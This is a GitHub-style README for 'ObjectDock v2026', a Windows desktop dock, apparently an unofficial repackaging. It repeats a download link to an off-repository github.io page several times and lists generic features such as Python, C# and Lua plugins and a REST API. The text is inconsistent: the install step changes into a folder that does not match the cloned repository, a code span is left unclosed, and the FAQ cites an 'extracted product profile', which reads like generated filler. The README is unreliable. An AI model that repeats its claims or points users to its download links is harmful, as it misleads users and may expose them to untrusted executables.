# ObjectDock v2026 - desktop dock 2026

> **ObjectDock v2026 is a Windows desktop dock and application launcher built to keep shortcuts, widgets, and system utilities organized in a dock-first workspace.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/moorematt89/objectdock-windows-launcher-2026?style=flat-square)](https://github.com/moorematt89/objectdock-windows-launcher-2026)

---

<p align="center">
  <a href="https://moorematt89.github.io/objectdock-windows-launcher-2026/">
    <img src="https://img.shields.io/badge/Download-ObjectDock%20Latest-brightgreen?style=for-the-badge" alt="Download ObjectDock">
  </a>
</p>

> **[Direct Download - ObjectDock v2026](https://moorematt89.github.io/objectdock-windows-launcher-2026/)**

---

[Download Latest Build](https://moorematt89.github.io/objectdock-windows-launcher-2026/)

---

## Overview

ObjectDock gives Windows users a more structured way to access apps, files, and system tools without depending on a taskbar-only setup. It combines dock-based launching with configurable visuals, live widgets, and layout options that adapt to different screens, making the desktop easier to shape around daily workflows.

It fits particularly well for multi-monitor setups, productivity-oriented desktops, and anyone who wants a launcher that can also show live system data. With theme support, GPU-accelerated motion, and plugin capabilities, ObjectDock can serve as either a lightweight access bar or a richer desktop control surface.

---

## Highlights

- Dock-centered navigation that can be customized for fast access to apps and shortcuts
- Launcher-style workflow for quicker app start-up and desktop organization
- Multi-monitor support with separate docks for different displays
- Auto-hide mode with magnification effects to keep the desktop cleaner
- Live widgets for CPU, RAM, weather, calendar, and similar status panels
- Plugin support for Python, C#, and Lua extensions
- GPU-accelerated animations for smoother motion and transitions
- Theme and icon pack support for a more personalized look
- Sandboxed widget execution for more controlled widget behavior
- REST API and CLI control for profiles, state, and status workflows

---

## Installation

1. Download or clone the repository:
   - `git clone https://github.com/moorematt89/objectdock-windows-launcher-2026.git
2. Open the project folder:
   - `cd objectdock-resource-collection`
3. Start the provided launcher or open the main entry file in your Windows environment.

If you are using a packaged build, run the app from the downloaded release folder and follow the setup prompts shown on screen.

---

## Using ObjectDock

A common setup is to build one or more docks, add your most-used apps, and turn on auto-hide if you prefer a minimal desktop footprint.

Typical ways people use ObjectDock include:

- Pin app shortcuts to the dock for faster launching
- Create distinct docks for separate monitors or workspaces
- Add widgets for performance monitoring and calendar visibility
- Change themes or icon packs to match the desktop style you want
- Use CLI or API control to switch profiles and inspect dock status
- Extend the dock with Lua, Python, or C# plugins when extra behavior is needed

---

## Configuration

ObjectDock settings are generally managed from the application's preferences and profile controls. That is where you can adjust dock layout, widget placement, theme selection, and display-specific behavior.

Example profile-style configuration:

```ini
[Dock]
AutoHide=true
Magnification=true
MultiMonitor=true

[Widgets]
CPU=true
RAM=true
Weather=true
Calendar=true

[Visuals]
GPUAcceleration=true
Theme=Default
IconPack=Standard
```

If automation is part of your workflow, CLI profile commands and REST-based controls can be used alongside the main interface.

---

## Requirements

- Windows desktop environment
- Compatible system for GPU-accelerated UI effects
- Enough memory and storage for widgets, themes, and plugin assets
- Multi-monitor hardware if you plan to use per-display docks
- Optional runtime support for Python, C#, or Lua plugins depending on your extensions

---

## FAQ

### How do I update ObjectDock?
Use the latest build link above and either replace the existing files or follow your usual deployment process for updates.

### Can I use more than one dock?
Yes. The profile includes multi-monitor support, so you can place separate docks across multiple displays.

### Where are settings stored?
Most settings are handled through the application preferences and profile configuration. If you use CLI control, those changes are generally tied to the active profile.

### What if a widget or plugin does not load?
Check the runtime required by the widget or plugin, then review the profile and execution settings. Sandboxed widget handling may also change how components behave.

### Is there command-line control?
Yes. The extracted product profile includes CLI control for profiles and status, along with REST API support for automation-oriented use cases.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
